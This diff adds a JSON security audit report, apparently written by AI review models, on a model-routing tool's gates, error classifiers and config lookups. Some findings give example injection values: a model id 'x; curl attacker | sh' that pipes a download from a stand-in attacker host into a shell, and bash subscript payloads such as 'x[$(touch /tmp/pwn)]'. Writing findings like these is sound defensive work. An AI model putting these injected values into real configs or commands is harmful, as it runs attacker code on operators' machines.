@@ -1,0 +1,309 @@
+{
+  "findings": [
+    {
+      "id": "DISS-C-001",
+      "severity": "MEDIUM",
+      "category": "config",
+      "anchor": "_catalog_provider_maps",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": "routes_to_agy",
+      "cross_file_justification": null,
+      "description": "_catalog_provider_maps swallows every exception from _find_project_root, the system catalog read and load_project_config (bare `except Exception`), builds maps from whatever survived, and caches that result under the project root for the life of the process. routes_to_agy under `cli-only` now depends on these maps; when a layer fails to load, the only rule left is the `gemini*` name prefix, so catalog-only Google models and aliases (`deep-research-pro`, `researcher`) are reported as not agy-routed. No log line is emitted on failure.",
+      "failure_mode": "A malformed or unreadable model-config.yaml / project config, or a packaging layout where `Path(__file__).parents[3]/defaults` does not exist, silently turns the agy opt-in gate fail-open for every catalog Google model, and the failed read is pinned in _CATALOG_PROVIDERS_CACHE until restart.",
+      "suggested_fix": "Log read failures at warning level; do not cache a result when any layer raised (or cache a sentinel with retry); and have routes_to_agy treat an unresolvable provider under `cli-only` as an explicit error rather than 'not google'. Add a test that feeds a corrupt YAML and asserts the gate does not fail open.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "a4-delta"
+    },
+    {
+      "id": "DISS-C-002",
+      "severity": "MEDIUM",
+      "category": "authz",
+      "anchor": "routes_to_agy",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": "routes_to_agy",
+      "cross_file_justification": "loader.py's docstring declares routes_to_agy the Python twin of `.claude/scripts/lib/agy-gate-lib.sh` routes_to_agy with 'one rule for every reader'. The diff changes the Python rule from the `gemini*` name test to catalog provider resolution but does not touch the shell library, so the two gates no longer implement the same predicate.",
+      "description": "The Python gate now recognises catalog Google models (`deep-research-pro`, `researcher`) as agy-routed under `cli-only`; the shell gate that hooks and scripts source is not updated in this change and still applies the bare `gemini*` name rule.",
+      "failure_mode": "Shell-side callers of the agy gate let catalog Google models through un-gated under `cli-only` while cheval actually dispatches them through agy, so the opt-in check is bypassed for exactly the models R3 was meant to cover.",
+      "suggested_fix": "Update agy-gate-lib.sh in the same change to consult the generated catalog maps (generated-model-maps.sh is already produced from the same YAML), and add a parity test that runs the same model list through both implementations.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "a4-delta"
+    },
+    {
+      "id": "DISS-C-003",
+      "severity": "MEDIUM",
+      "category": "authz",
+      "anchor": "catalog_provider_of",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": "routes_to_agy",
+      "cross_file_justification": null,
+      "description": "catalog_provider_of returns the raw provider prefix of an alias target. An alias whose target is `gemini-headless:<model>` therefore resolves to provider `gemini-headless`, and routes_to_agy compares that only against `\"google\"`. The earlier by-name branch matches the literal `gemini-headless` token in the model string, not alias names, so an alias such as `researcher: gemini-headless:gemini-2.5-pro` is dispatched through agy in practice but routes_to_agy returns False in every headless mode, not just `cli-only`.",
+      "failure_mode": "agy opt-in gate silently bypassed for any aliased gemini-headless target; the model is sent through the agy CLI without the gate ever firing.",
+      "suggested_fix": "In routes_to_agy, resolve aliases before the by-name check, or treat `catalog_provider_of(m) == \"gemini-headless\"` as agy-routed in any mode (keeping `google` only under `cli-only`). Add a unit test with an alias pointing at a gemini-headless target.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "a4-delta"
+    },
+    {
+      "id": "DISS-C-004",
+      "severity": "LOW",
+      "category": "injection",
+      "anchor": "_calibrate_hint",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "_calibrate_hint formats entry.model_id / head.model_id unquoted into _PROBE_COMMAND, and cmd_invoke prints the result to stderr prefixed with `run:` and embeds it in the `calibrate` field of the error JSON. Model ids originate in project config discovered by cwd walk, i.e. from whichever repository cheval is executed in.",
+      "failure_mode": "A model id such as `x; curl attacker | sh` checked into a project's model config becomes a copy-paste command injection against the operator, and any tooling that auto-executes the `calibrate` field runs it directly.",
+      "suggested_fix": "Wrap the model id with shlex.quote when building the hint (and quote the --transport value), and validate model ids against a strict character allow-list at config load time.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "a4-delta"
+    },
+    {
+      "id": "DISS-C-005",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": "_RE_THROTTLE_STATUS",
+      "anchor_type": "line",
+      "scope": "diff",
+      "trigger_anchor": "is_throttle_message",
+      "cross_file_justification": null,
+      "description": "The status regex `(?<![\\d,.])(?:429|529)(?!\\d|[,.]\\d|\\s*k?\\s*tokens\\b)` only excludes 429/529 when adjacent to digits, separators or 'tokens'. It still matches those digits embedded in alphanumeric tokens: request ids (`req_a529fz`), UUIDs (`5f429a1b-...`), hex hashes, file paths. Because ClaudeHeadlessAdapter now lets is_throttle_message win over is_context_limit_message, a genuine size verdict whose text carries such an id is reclassified as a throttle.",
+      "failure_mode": "Oversized payloads are retried and walked to the next voice (the exact case the D-1.1b arm exists to prevent), inflating provider spend and rate-limit pressure; error text is CLI/provider controlled and can include echoed prompt or tool output, so the misclassification is externally influenceable.",
+      "suggested_fix": "Anchor the status match to a status context, e.g. `(?<![\\w,.])(?:429|529)(?!\\w|[,.]\\d|\\s*k?\\s*tokens\\b)` or `(?:status|error|http)\\W{0,3}(?:429|529)\\b`, and add fixtures containing UUIDs and request ids alongside a context-limit statement.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "a4-delta"
+    },
+    {
+      "id": "DISS-C-006",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": "is_context_limit_message",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": "is_context_limit_message",
+      "cross_file_justification": "cheval.py cmd_invoke (diff-touched) records parse_context_limit output (observed_input_tokens, provider_limit) into the observed-ceiling store (_observed_store_path, observation_recorded) and refuses to walk; the broadened matcher in ceiling.py decides what feeds that store.",
+      "description": "is_context_limit_message now classifies on bare `~N tokens (limit M)` style numeric patterns (_RE_INPUT_ONLY, _RE_INPUT_PLUS_OUTPUT, _RE_CLI_TOKENS_LIMIT) with no marker word. Any CLI or provider error text containing such a pattern, including content echoed from the prompt or tool output, is treated as a provider size verdict and its numbers are persisted as calibration observations.",
+      "failure_mode": "Calibration-store poisoning: one crafted or coincidental error string lowers the recorded ceiling, after which every larger payload is refused with calibration_needed instead of being walked, until an operator re-probes.",
+      "suggested_fix": "Accept the bare numeric form only when the message also matches the CLI's known pre-flight shape (e.g. 'Prompt is too long' / 'the request is'), and sanity-check parsed numbers against the catalog ceiling (reject values far below it) before recording an observation.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "a4-delta"
+    },
+    {
+      "id": "DISS-C-001",
+      "severity": "MEDIUM",
+      "category": "injection",
+      "anchor": "agy_catalog_provider",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": ".claude/scripts/lib/agy-gate-lib.sh",
+      "cross_file_justification": null,
+      "description": "The new lookup interpolates the caller-supplied model string directly into bash array subscripts (`${MODEL_IDS[$1]:-$1}`, `${MODEL_PROVIDERS[$1]:-${MODEL_PROVIDERS[$id]:-}}`) after sourcing `generated-model-maps.sh`. Plain `${arr[key]}` expansion is injection-safe only for arrays declared with `declare -A`. If the generated file omits either name (for example no aliases emitted) or declares it indexed, bash treats the reference as an indexed array and evaluates the subscript arithmetically, so a model id like `x[$(cmd)]` executes `cmd`. The subshell discards stderr (`2>/dev/null`) and swallows source failures (`|| exit 0`), so nothing would surface. Model ids reach this path from `.loa.config.yaml` stage/model settings via `routes_to_agy` and the new `*)` branch of `provider_of` in `run-preflight.sh`. The code checks `-f \"$maps\"` and the bash version but never verifies the declared type of the arrays or the shape of the id.",
+      "failure_mode": "A repo-controlled or malformed model id reaches an arithmetic subscript context during preflight or gate checks and runs shell commands whenever the generated maps file does not declare both MODEL_IDS and MODEL_PROVIDERS as associative arrays.",
+      "suggested_fix": "Validate the id before any lookup, e.g. `[[ $m =~ ^[A-Za-z0-9][A-Za-z0-9._:/-]*$ ]] || return 0`, and inside the subshell assert that `declare -p MODEL_IDS` and `declare -p MODEL_PROVIDERS` both begin with `declare -A` before dereferencing (exit the subshell otherwise). Add a bats case feeding a hostile id (`'x[$(touch /tmp/pwn)]'`) against a maps file that lacks MODEL_IDS and assert nothing runs.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "b4-delta"
+    },
+    {
+      "id": "DISS-C-002",
+      "severity": "LOW",
+      "category": "config",
+      "anchor": "routes_to_agy",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": ".claude/scripts/lib/agy-gate-lib.sh:agy_catalog_provider",
+      "cross_file_justification": "The bash predicate is documented as the twin of `loa_cheval.config.loader.routes_to_agy` / `cheval._entry_routes_to_agy`, and `test_agy_opt_in_gate.py::test_routes_to_agy_matches_the_bash_rule` now asserts `deep-research-pro` and `researcher` are agy-routed under cli-only. When the bash side cannot read the maps it silently gives the opposite answer for exactly those ids.",
+      "description": "`agy_catalog_provider` falls back silently to the legacy `gemini*` name rule when `generated-model-maps.sh` is absent, fails to source, or bash is older than 4. Under `cli-only`, `routes_to_agy deep-research-pro` then returns 1 (not agy-routed) and `agy_route_planned` reports the route as planned even with `hounfour.headless.agy_opt_in` off, while cheval classifies the same hop as agy-routed and refuses it. This recreates the bash-versus-Python split that R3 set out to close, in the direction where preflight is more permissive than the runtime gate, and no warning is emitted.",
+      "failure_mode": "Preflight reports a Google catalog model as planned without the opt-in and cheval refuses it at runtime; the argv-exposure route is never flagged by preflight for those ids when the maps are unreadable.",
+      "suggested_fix": "When bash is 4 or newer and the maps file is missing or unsourceable, print a one-time warning to stderr and return a distinct status (e.g. 2) from `agy_catalog_provider` so `routes_to_agy` and `agy_route_planned` can report 'unresolvable' rather than 'planned'. Add a bats test that removes the maps file and asserts the warning and the non-planned result.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "b4-delta"
+    },
+    {
+      "id": "DISS-C-003",
+      "severity": "LOW",
+      "category": "other",
+      "anchor": "_zero_live_spend",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": ".claude/adapters/tests/test_ceiling_probe_cli_transport.py",
+      "cross_file_justification": null,
+      "description": "The live-spend guard switched from a before/after comparison of the real host ledger `.run/model-invoke.jsonl` to checking only the file named by `LOA_MODELINV_LOG_PATH`. The new check is only as strong as every cheval invoke path honoring that variable; a path that still appends to the default ledger would now escape detection. The fixture also raises KeyError (a test error, not a clean assertion) if the `_isolate_ledgers` conftest fixture does not export the variable, and the module relies on `os` being imported, which the shown diff does not add. This guard exists to stop test payloads from being sent to a real provider.",
+      "failure_mode": "A live model call that escapes the fake in this module is no longer detected if cheval records it anywhere other than the tmp ledger, so test content could reach a real provider silently.",
+      "suggested_fix": "At fixture setup assert `LOA_MODELINV_LOG_PATH` is set and resolves under tmp_path, and assert via cheval's own ledger-path resolver that it will write there. Optionally retain a module-scoped size-delta check on the host ledger as a secondary signal with a message that names concurrent runs as a possible cause.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "b4-delta"
+    },
+    {
+      "id": "DISS-C-001",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": "is_throttle_message",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": "CHANGELOG.md hunk: \"unless a throttle marker is present: Bedrock's \\\"Too many tokens, please wait before trying again\\\" is a rate limit, retried then walked \u2014 one is_throttle_message() rule in routing/ceiling.py serves the adapter and the probe (r251-3)\"",
+      "cross_file_justification": "The diff changes only documentation, but the CHANGELOG, migration doc and SDD hunks all document new runtime behaviour in loa_cheval/routing/ceiling.py (is_throttle_message) and the claude-headless adapter: a free-text marker found in the CLI diagnostic now overrides the PROVIDER_CONTEXT_LIMIT classification. The implementing code is outside the diff and could not be read in this session, so this is anchored on the documented contract.",
+      "description": "The headless adapter's context-limit verdict (\"not walked, no breaker count\", the rule that prevents an oversized payload from being re-sent to every fallback voice) is now overridden whenever a throttle phrase is present in the CLI diagnostic. The CHANGELOG also states that classification runs on the full diagnostic. A substring match over free text is a weaker signal than a structured error code: any diagnostic that happens to contain the phrase (a provider message embedded in a larger error, or prompt/tool content echoed into the CLI's output) would reclassify a genuine size rejection as a throttle. That path then retries and walks the identical payload to the next configured voice.",
+      "failure_mode": "A request correctly rejected by the CLI pre-flight for size is reclassified as a rate limit, retried, charged to the breaker, and forwarded unchanged to the next voice in the chain (possibly a different provider or the HTTP route). This defeats the not-walked safeguard and incurs the upload and spend it was designed to avoid; with attacker-shaped prompt content it is a cheap way to force fan-out of one oversized payload across every configured provider.",
+      "suggested_fix": "Classify throttles from the CLI's structured result (exit code, JSON error type such as Bedrock ThrottlingException, or an explicit HTTP 429) instead of a substring over the full diagnostic. If text matching must remain, restrict it to the CLI's own error line, require the context-limit signature to be absent before reclassifying, and add a test where the throttle phrase appears inside prompt-derived text and the verdict must stay PROVIDER_CONTEXT_LIMIT.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "c4-delta"
+    },
+    {
+      "id": "DISS-C-001",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": "_classify_unguarded",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": "tools/ceiling-probe-live.py: ceiling.is_throttle_message(throttle_text) and (ceiling.is_context_limit_message(full) or ceiling.is_token_limit_message(full))",
+      "cross_file_justification": "The diff removes the probe's local _THROTTLE regex and calls loa_cheval.routing.ceiling.is_throttle_message, which is not in the diff. Per sprint.md the same function now also drives ClaudeHeadlessAdapter._raise_for_error (throttle wins -> RateLimitError, retried then route-walked). The precedence rule is therefore shared across the probe and the live adapter.",
+      "description": "The throttle-wins-over-context-limit rule was widened from the probe's narrow regex (throttl, please wait, status 429, rate limit, tokens per min) to a shared matcher that also accepts 'overloaded', 'too many requests', 'quota' and a 529 in status position. The matcher runs on free-form provider error text and is substring based. Any terminal context-limit message that happens to contain one of the new words (for example a provider wording like 'input exceeds the context quota') is classified as transient. In the probe that means a size rejection is retried on the TPM backoff schedule and the bisection reads an inconsistent result; in the headless adapter it means the request is retried and then walked to the next route, so a payload the operator pinned to one provider can be re-sent to a different provider without the operator seeing why. The function body could not be verified from the diff, so this is recorded as a hardening concern rather than a confirmed defect. Provider error text is not attacker controlled in normal operation, which keeps severity LOW.",
+      "failure_mode": "A terminal context-limit error carrying a throttle-like word is misclassified as a rate limit: the probe burns budget on pointless retries and may record a partial outcome, and the adapter silently fails over to an alternate route, sending the prompt to a provider the operator did not select.",
+      "suggested_fix": "In is_throttle_message, require either a status-position 429/529 or an explicit throttle phrase, and only accept bare 'quota' or 'overloaded' when paired with a rate or time word (per minute, rate, retry). Add negative cases to the probe-vs-adapter conformance test for context-limit strings that contain 'quota' and 'overloaded'. Have _raise_for_error log the matched throttle marker whenever it overrides a context marker so a route walk is auditable.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless",
+      "chunk": "d4-delta"
+    }
+  ],
+  "metadata": {
+    "type": "audit",
+    "model": "gpt-5.5-pro",
+    "sprint_id": "sprint-251",
+    "timestamp": "2026-10-07T15:54:44Z",
+    "status": "reviewed",
+    "status_note": "no findings met the BLOCKING/ADVISORY bar \u2014 not an approval of unreviewed surface",
+    "degraded": false,
+    "schema_enforced": false,
+    "parse_path": "normalized",
+    "model_attempts": [
+      "gpt-5.5-pro:clean"
+    ],
+    "final_model": "gpt-5.5-pro",
+    "rejected_summary": [],
+    "rejected_count": 0,
+    "cost_usd": 0,
+    "tokens_input": 2,
+    "tokens_output": 4633,
+    "companion_voice": {
+      "planned": true,
+      "family": "anthropic",
+      "family_basis": "configured_primary",
+      "chain": [
+        "claude-headless"
+      ],
+      "shared_hops": [
+        "claude-headless"
+      ],
+      "model": "claude-headless",
+      "answered_by": "claude-headless",
+      "status": "succeeded",
+      "failure_class": null,
+      "cost_cents": 0,
+      "attempts": [
+        "claude-headless:reviewed"
+      ],
+      "independent": true,
+      "counted_as": "independent_voice",
+      "primary_succeeded_model": "codex-headless",
+      "rejected_sidecar": null
+    },
+    "rejected_sidecars": [],
+    "hallucination_filter": {
+      "applied": true,
+      "downgraded": 0
+    },
+    "scope": {
+      "diff_range": null,
+      "diff_oids": null,
+      "diff_sha256": "e92bbf3bafcaca7aa6630edad43964ba93af655ab4b06120de650a760d367e0a",
+      "run_tag": "d4-delta"
+    },
+    "merged_from_chunks": [
+      {
+        "chunk": "a4-delta",
+        "file": "adversarial-audit-a4-delta.json",
+        "status": "clean",
+        "findings": 6,
+        "voices_succeeded_ids": [
+          "codex-headless",
+          "claude-headless"
+        ],
+        "rejected_sidecar": null
+      },
+      {
+        "chunk": "b4-delta",
+        "file": "adversarial-audit-b4-delta.json",
+        "status": "clean",
+        "findings": 3,
+        "voices_succeeded_ids": [
+          "codex-headless",
+          "claude-headless"
+        ],
+        "rejected_sidecar": null
+      },
+      {
+        "chunk": "c4-delta",
+        "file": "adversarial-audit-c4-delta.json",
+        "status": "clean",
+        "findings": 1,
+        "voices_succeeded_ids": [
+          "codex-headless",
+          "claude-headless"
+        ],
+        "rejected_sidecar": null
+      },
+      {
+        "chunk": "d4-delta",
+        "file": "adversarial-audit-d4-delta.json",
+        "status": "clean",
+        "findings": 1,
+        "voices_succeeded_ids": [
+          "codex-headless",
+          "claude-headless"
+        ],
+        "rejected_sidecar": null
+      }
+    ],
+    "head": "58f87195",
+    "note": "per-chunk dissent (each chunk under the voice's 24K input budget); findings are the union of every chunk's latest run; the per-chunk envelopes and rejected sidecars stay beside this file"
+  },
+  "verdict_quality": {
+    "consensus_outcome": "consensus",
+    "truncation_waiver_applied": false,
+    "voices_planned": 2,
+    "voices_succeeded": 2,
+    "voices_succeeded_ids": [
+      "codex-headless",
+      "claude-headless"
+    ],
+    "voices_dropped": [],
+    "chain_health": "ok",
+    "confidence_floor": "high",
+    "rationale": "multi-voice aggregate (2/2 succeeded); chain_health=ok",
+    "single_voice_call": false,
+    "status": "APPROVED"
+  }
+}
